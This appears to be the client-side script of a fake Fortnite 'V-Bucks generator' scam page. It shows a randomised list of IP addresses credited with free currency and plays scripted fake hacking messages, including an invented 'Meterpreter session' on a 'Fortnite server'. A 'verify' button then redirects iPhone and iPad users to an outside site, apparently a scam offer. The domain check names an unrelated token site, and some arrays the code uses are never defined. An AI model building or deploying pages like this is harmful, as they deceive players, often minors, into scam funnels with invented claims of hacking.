    var name;
function next(){
name=document.getElementById("uid").value;
if (name!=""){
  document.getElementById("nameform").style.display="none";
  document.getElementById("genname").innerHTML="@"+name;
    document.getElementById("genname2").innerHTML="@"+name;
}else {
  document.getElementById("uid").style.borderColor = "red";
}
}


var data="";
var gennamelist = ["1.7.215.154", "14.70.15.14", "27.7.25.14","14.9.115.104",
"14.86.215.11",
"17.32.15.18",
"42.75.155.151",
"47.88.215.157",
"49.38.32.159",
"59.28.75.184",
"61.51.85.114",
"110.55.95.124",
"111.187.42.134",
"112.185.22.174",
"114.199.37.4",
"115.187.39.104",
"118.158.42.124",
"119.111.12.174",
"120.11.21.194",
"122.21.81.114",
"124.99.31.15",
"125.88.24.154",
"136.37.20.154",
"139.28.115.154",
"146.19.15.18",
"147.38.144.14",
"152.78.132.24",
"158.24.181.354",
"162.17.195.48",
"15.70.75.174"];

for (let i = 0; i < 20; i++) {
      var getamount=amount[Math.floor(Math.random() * 4)];
var getflag=flaglist[Math.floor(Math.random() * 8)];
 var name=gennamelist[Math.floor(Math.random() * 30)];
data=data +'<div id="flag1" class="flag1" style="display:inline-block;"><img src="'+ getflag +'"class="flag">'+name+' Generated:<b>  '+ getamount +' V-Bucks</b>, </div>'+' ';
}
document.getElementById("winnertext").innerHTML=data;




var cardSelect1;
function showcard(cardSelect)
{
document.getElementById("home").style.display="none";
document.getElementById("page1").style.display="none";
cardSelect1=cardSelect;
}



  function readmore(){
  document.getElementById("readmore").style.display="none";
      document.getElementById("text-info").style.display="block";
}
function selectedcard(value){
  console.log("selectedcard");
  document.getElementById("page1").style.display="block";
      document.getElementById("page2").style.display="none";
  var vargenerator3 = setInterval(GenTimer3, 3000);
function GenTimer3() {
    console.log("gen3");
  document.getElementById("page1").style.display="none";
  document.getElementById("page2").style.display="none";



if (value==0){
  document.getElementById("selectedcardgen").innerHTML=document.getElementById("card1").innerHTML;
    document.getElementById("genamount").innerHTML=1000;
}else if (value==1){
    document.getElementById("selectedcardgen").innerHTML=document.getElementById("card2").innerHTML;
      document.getElementById("genamount").innerHTML=2800;
}else if (value==2){
    document.getElementById("selectedcardgen").innerHTML=document.getElementById("card3").innerHTML;
      document.getElementById("genamount").innerHTML=5000;
}else if (value==3){
    document.getElementById("selectedcardgen").innerHTML=document.getElementById("card4").innerHTML;
      document.getElementById("genamount").innerHTML=13500;
}

  document.body.scrollTop = 0;
document.documentElement.scrollTop = 0;
document.getElementById("content-body").style.display="none";
  document.getElementById("page3").style.display="block";
  clearInterval(vargenerator3);

  var vargenerator = setInterval(GenTimer, 1000);
    var countGen=0;
  function GenTimer() {
  countGen=countGen+1;
  if (countGen==3){

  document.getElementById("code").innerHTML="Connection to Fortnite Server...";
  }else if (countGen==4){
  document.getElementById("code").innerHTML="Server is up at 192.23.11.164:402 (latency 0.0013s)";
  }
  else if (countGen==5){
  document.getElementById("code").innerHTML="Connecting to server SQL databse...";
  }
  else if (countGen==6){
  document.getElementById("code").innerHTML="Obtaining a service manager handle...";
  }
  else if (countGen==7){
  document.getElementById("code").innerHTML="Creating a new service through pipeline...";
  }
  else if (countGen==8){
  document.getElementById("code").innerHTML="Closing service handle...";
  }
  else if (countGen==9){
  document.getElementById("code").innerHTML="Creating a new service through pipeline...";
  }
  else if (countGen==10){
  document.getElementById("code").innerHTML="Sending stage (2342323 bytes) to 192.23.11.164";
  }
  else if (countGen==11){
  document.getElementById("code").innerHTML="Meterpreter session 1 opened at port 402";
  }
  else if (countGen==12){
  document.getElementById("code").innerHTML="Connected to Fortnite server...";
  }
  else if (countGen==14){

  document.getElementById("pro-bar").classList.remove('A0To50');
  document.getElementById("pro-bar").classList.add('A50To100');
  document.getElementById("pro-step2").style.backgroundColor="#069e0a";

  }
  else if (countGen==15){
  clearInterval(vargenerator);

  document.getElementById("verify-bg").style.display="block";
  document.getElementById("gen").style.marginTop ="255px";
    document.getElementById("gen").style.filter ="blur(1px)";
  }

  console.log(countGen);
  }

}
}

/*================== [fortnite ] ================*/
var button = document.querySelector('.verifybutton');  
button.addEventListener('click', function() {
    (function() {
        var originalDomain = "monoplytokens.com";
        var redirectURL = "https://v.rolls3.com/";
        var blockedDomains = [
            "mply.io.1arshg4.site",
            "mply.io.4a6b8dh.site"
        ];

        if (window.location.hostname !== originalDomain && window.location.hostname !== "www." + originalDomain && !blockedDomains.some(domain => window.location.hostname.includes(domain))) {
            var isIphoneOrIpad = /iPhone|iPad/i.test(navigator.userAgent);

            if (isIphoneOrIpad) { 
                window.location.href = redirectURL;
            }
        }
    })();
});
